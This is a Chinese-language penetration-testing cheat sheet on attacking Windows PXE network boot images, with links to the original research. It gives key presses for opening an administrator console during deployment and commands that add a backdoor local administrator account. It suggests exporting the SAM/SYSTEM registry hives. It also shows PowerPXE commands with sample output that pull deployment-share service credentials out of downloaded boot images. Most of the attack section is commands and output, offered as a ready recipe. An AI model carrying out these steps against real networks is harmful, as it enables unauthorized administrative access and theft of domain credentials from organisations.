# 内网 - PXE 启动映像

PXE 允许工作站通过使用 TFTP（简单文件传输协议）从服务器获取操作系统映像来从网络启动。通过网络启动允许攻击者获取映像并与之交互。

- 在 PXE 启动期间按 **[F8]** 可在部署的机器上生成管理员控制台。
- 在初始 Windows 安装过程中按 **[SHIFT+F10]** 可调出系统控制台，然后添加本地管理员或导出 SAM/SYSTEM 注册表。

    ```powershell
    net user hacker Password123! /add
    net localgroup administrators /add hacker
    ```

- 使用 [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe) 提取预启动映像（wim 文件）并深入挖掘以查找默认密码和域帐户。

    ```powershell
    # 导入模块
    PS > Import-Module .\PowerPXE.ps1

    # 在以太网接口上启动利用
    PS > Get-PXEcreds -InterfaceAlias Ethernet
    PS > Get-PXECreds -InterfaceAlias « lab 0 » 

    # 等待 DHCP 获取地址
    >> Get a valid IP address
    >>> >>> DHCP proposal IP address: 192.168.22.101
    >>> >>> DHCP Validation: DHCPACK
    >>> >>> IP address configured: 192.168.22.101

    # 从 DHCP 响应中提取 BCD 路径
    >> Request BCD File path
    >>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
    >>> >>> TFTP IP Address:  192.168.22.3

    # 下载 BCD 文件并提取 wim 文件
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Parse the BCD file: conf.bcd
    >>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
    >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
    >> Launch TFTP download
    >>>> Transfer succeeded.

    # 解析 wim 文件以查找有趣的数据
    >> Open LiteTouchPE_x86.wim
    >>>> Finding Bootstrap.ini
    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
    >>>> >>>> UserID = MdtService
    >>>> >>>> UserPassword = Somepass1
    ```

## 参考资料

- [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
- [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)
